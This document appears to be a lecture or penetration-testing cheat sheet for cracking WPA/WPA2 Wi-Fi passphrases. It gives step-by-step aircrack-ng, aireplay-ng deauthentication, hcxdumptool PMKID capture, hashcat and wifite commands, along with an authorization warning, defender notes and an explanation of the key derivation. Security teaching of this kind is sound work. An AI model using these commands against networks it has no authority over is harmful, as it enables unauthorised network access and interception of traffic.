Wi-Fi WPA/WPA2 Cracking - Cheat Sheet

Capture a WPA/WPA2 4-way handshake (or a PMKID) and crack the pre-shared key
offline. Requires a Wi-Fi adapter that supports MONITOR MODE + PACKET INJECTION
- an ALFA card (e.g. AWUS036ACH / AWUS036NHA) is the standard choice because
most built-in laptop cards can't inject. Tools: aircrack-ng suite, hcxdumptool.

>>> Only test networks you own or are authorized to test. <<<
Replace the placeholders (<...>) with your own values.


Step 1 - Plug in the ALFA card + enable monitor mode

    iwconfig                    # find the interface (e.g. wlan0 / wlan1 for the ALFA)
    ip a                        # confirm the adapter is up

    sudo airmon-ng check kill   # kill NetworkManager/wpa_supplicant that interfere
    sudo airmon-ng start wlan0  # -> creates wlan0mon (monitor mode)
    iwconfig                    # confirm "Mode:Monitor" on wlan0mon

(Manual alt: ip link set wlan0 down; iw dev wlan0 set type monitor; ip link set wlan0 up)


Step 2 - Scan for target networks

    sudo airodump-ng wlan0mon

Note for your target:
    BSSID   = AP MAC address        CH  = channel        ESSID = network name
    ENC/CIPHER/AUTH = WPA2 PSK       (also watch which STATIONs/clients are connected)

Press the network's channel and BSSID down before moving on.


Step 3 - Lock onto the target + capture

    sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

Leave this running - it writes capture-01.cap. Top-right shows
"WPA handshake: <BSSID>" once a handshake is caught.


Step 4 - Force a handshake with a deauth (in a 2nd terminal)

Kick a connected client so it reconnects and re-does the 4-way handshake:

    # targeted (best - use a real client MAC from airodump's STATION list):
    sudo aireplay-ng -0 5 -a <BSSID> -c <client-MAC> wlan0mon
    # broadcast (no client specified - less reliable):
    sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
    # (-0 is shorthand for --deauth; the lecture demo uses -0 2)

Watch the airodump window (Step 3) for "WPA handshake" to appear. A handful of
deauths is enough - don't flood.


Step 5 - Crack the handshake offline

Option A - aircrack-ng (CPU):

    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap

Option B - hashcat (GPU, much faster). Convert the .cap first:

    hcxpcapngtool -o hash.22000 capture-01.cap      # new WPA*22000 format
    hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
    # older path: cap2hccapx capture-01.cap out.hccapx  ->  hashcat -m 2500

A crack prints "KEY FOUND! [ <passphrase> ]".


Step 6 - PMKID attack (clientless - no deauth, no clients needed)

Some APs leak a PMKID in the first handshake message - crackable without any
connected client:

    sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1
    # (or target: --bpf / channel options; let it run briefly)
    hcxpcapngtool -o pmkid.22000 pmkid.pcapng
    hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt


All-in-one (automation)

    sudo wifite                 # scans, deauths, captures handshake/PMKID, cracks
    # (also does WPS/PIN attacks where the AP is vulnerable)


Cleanup - restore normal networking

    sudo airmon-ng stop wlan0mon
    sudo systemctl restart NetworkManager       # (or service network-manager restart)


Quick reference (interfaces & files)
    wlan0     managed interface     wlan0mon   monitor interface
    capture-01.cap   handshake capture      hash.22000   hashcat WPA format
    key point: WPA2-PSK security = the passphrase; everything above just grabs
    material to crack it offline.


Defender notes (for the report)
  - Long, random passphrase (defeats wordlists) and WPA3 (SAE resists offline crack).
  - Disable WPS (PIN brute). Enable 802.11w / Management Frame Protection - it
    blocks the deauth that forces the handshake.


Key derivation (why the handshake is crackable)
    PSK (passphrase + SSID) -> PMK (PBKDF2-SHA1, 4096 rounds) -> PTK (per-session)
    The 4-way handshake exchanges nonces to derive PTK from PMK. With the captured
    handshake + a wordlist guess you can recompute PMK -> PTK -> MIC and compare.
    That's why offline cracking works: you only need the passphrase guess + SSID.

Passive vs active capture
    Passive: just listen on the right channel - you catch a handshake whenever a
    client naturally (re)associates. Slower but stealthier.
    Active: send deauth frames (Step 4) to force a reconnect. Faster, but generates
    visible 802.11 management frames.

Hardware notes
    ALFA AWUS036ACH/NHA  standard choice (Kali/Parrot compatible, monitor + inject)
    WiFi Pineapple       rogue-AP platform (MitM, captive portal, recon)
    Raspberry Pi         portable drop box running hostapd + aircrack-ng
    DSTIKE Deauther      ESP8266-based, sends deauth frames (demo/CTF only)

Key idea: WPA/WPA2-PSK reduces to one secret - the passphrase - and the 4-way
handshake (or a PMKID) contains everything needed to verify guesses offline. An
ALFA adapter gives you the monitor mode + injection to sniff the air and deauth
a client into re-handshaking; from there it's just cracking (aircrack for CPU,
hashcat -m 22000 for GPU). Weak passphrases fall fast; WPA3 + a strong key do not.
